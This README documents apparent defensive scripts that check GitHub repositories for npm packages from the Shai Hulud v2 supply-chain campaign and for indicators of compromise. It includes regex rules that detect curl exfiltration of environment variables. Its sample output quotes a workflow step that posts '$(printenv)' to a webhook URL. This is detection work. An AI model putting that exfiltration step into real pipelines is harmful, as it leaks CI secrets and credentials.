# Scan Repo for vuln npm packages

## Why this?

Because this recently massive attack:

* https://posthog.com/blog/nov-24-shai-hulud-attack-post-mortem
* https://socket.dev/blog/shai-hulud-strikes-again-v2
* https://www.wiz.io/blog/shai-hulud-2-0-ongoing-supply-chain-attack


Then, the next scripts:

- The next scripts only allow to check if your Github repo has been compromised.
- It looks for Indicators of Compromise (IoCs) such as vulnerable npm packages and traces of malicious activity.


## Check for compromise 

### 01. Scanning for NPM Package compromised

**1. Create a text file following this format**

```sh
$ nano vuln_list.txt

# source: https://socket.dev/blog/shai-hulud-strikes-again-v2
# campaign: Shai Hulud Strikes Again (v2)

@accordproject/concerto-analysis (v3.24.1)
@accordproject/concerto-linter (v3.24.1)
@accordproject/concerto-linter-default-ruleset (v3.24.1)
...
```

**2. Convert it to json**

```sh
$ ./convert_vuln_list_to_json.py vuln_list.txt vulns.json
Reading vulnerable package list from: vuln_list.txt
Using vuln_list.txt (723 unique packages, 933 total vulnerable versions)
Source:   https://socket.dev/blog/shai-hulud-strikes-again-v2
Campaign: Shai Hulud Strikes Again (v2)
Date:     2025-11-27
Saved JSON to: vulns.json
```

**3. Scan repos**

```sh
## chilcano/hello-dapp
$ ./scan_vuln_pkgs_in_repo.py chilcano/hello-dapp vulns.json --recursive

Using vulns.json (723 unique packages, 933 total vulnerable versions)
Source:   https://socket.dev/blog/shai-hulud-strikes-again-v2
Campaign: Shai Hulud Strikes Again (v2)
Date:     2025-11-27

Scanning my-app/apps/backend/package.json
-----------------------------------------------
No vulnerable versions detected in this file.

Scanning my-app/apps/frontend/package.json
-----------------------------------------------
No vulnerable versions detected in this file.

Scanning my-app/contracts/package.json
-----------------------------------------------
No vulnerable versions detected in this file.

Scanning my-app/package.json
-----------------------------------------------
No vulnerable versions detected in this file.

## zama-ai/fhevm
$ ./scan_vuln_pkgs_in_repo.py zama-ai/fhevm vulns.json --recursive
```

### 02. Scanning for Indicators of Compromise (IoC)

**1. Create a JSON file with your IoC to be detected**

```sh
$ nano iocs_shai_hulud_v2.json

{
  "metadata": {
    "campaign": "Shai Hulud attack v2",
    "date": "2025-11-26",
    "source": "https://socket.dev/blog/shai-hulud-strikes-again-v2",
    "description": "IOC rules capturing environment-variable exfiltration via curl or subprocess injection, as seen in the Shai Hulud v2 supply-chain attack."
  },

  "ioc_rules": [

    {
      "id": "CURL_ENV_EXFIL",
      "severity": "critical",
      "description": "curl posting environment variables using -d/--data with printenv/env",
      "regex": "curl(?:(?!\\n).)*(?:-d|--data|--data-binary|--data-raw)(?:(?!\\n).)*(?:printenv|env)(?:(?!\\n).)*https?://[a-zA-Z0-9_.:/%-]+"
    },

    {
      "id": "CURL_POST_ENV_EXFIL",
      "severity": "critical",
      "description": "curl -X POST or --request POST exfiltrating environment variables",
      "regex": "curl(?:(?!\\n).)*(?:-X\\s*POST|--request\\s+POST)(?:(?!\\n).)*(?:-d|--data|--data-binary|--data-raw)(?:(?!\\n).)*(?:printenv|env)(?:(?!\\n).)*https?://[a-zA-Z0-9_.:/%-]+"
    },
...
...

    {
      "id": "CURL_PRINTENV_MULTILINE",
      "description": "Multiline curl exfiltration of environment variables (GitHub Actions)",
      "regex": "(curl[\\s\\S]{0,300}-d\\s*['\\\"]?\\$?\\(printenv\\)['\\\"]?[\\s\\S]{0,300}((https?:\\/\\/[^\\s'\\\"]+)|(\"?\\$[A-Za-z_][A-Za-z0-9_]*\"?)|(\\$\\{\\{[\\s\\S]{1,100}?\\}\\})))"
    }

  ]
}
```

**2. Scan for IoC in local repos**

- The script requires a PAT in order to fetch remote repo

```sh
## chilcano/hello-dapp

$ export GITHUB_TOKEN=ghp_cafecafe.......

$ ./scan_iocs_local_repo.py chilcano/hello-dapp main iocs_shai_hulud_v2.json 

Using IOC file: iocs_shai_hulud_v2.json (5 rules)
Campaign: Shai Hulud attack v2
Date:     2025-11-26

Using cached repository: $HOME/.cache/iocscan/chilcano/hello-dapp/main
From https://github.com/chilcano/hello-dapp
 * branch            main       -> FETCH_HEAD
Already on 'main'
Scanning Local Repository
Repo:   https://github.com/chilcano/hello-dapp
Branch: main
Commit: d137bca5e51ea203476724c5124ba4d93a3212bc
GitHub: https://github.com/chilcano/hello-dapp

Total files scanned: 53
=== IOCs Detected ===

File: .github/workflow/send-sensitive-info-to-url.yaml
  - Rule: CURL_PRINTENV_MULTILINE (Multiline curl exfiltration of environment variables (GitHub Actions))
    Line: 51
    Matched: curl -X POST -s \\n            -d "$(printenv)" \\n            "$WEBHOOK_URL"\n\n      - name: Confirm delivery\n        run: |\n          echo "Printenv posted to:"\n          echo "👉 $WEBHOOK_URL"
    Context:
              run: |
                echo "Sending printenv to webhook..."
                curl -X POST -s \
                  -d "$(printenv)" \
                  "$WEBHOOK_URL"
    GitHub (branch): https://github.com/chilcano/hello-dapp/blob/main/.github/workflow/send-sensitive-info-to-url.yaml#L51
    GitHub (commit): https://github.com/chilcano/hello-dapp/blob/d137bca5e51ea203476724c5124ba4d93a3212bc/.github/workflow/send-sensitive-info-to-url.yaml#L51

Scan completed.
```

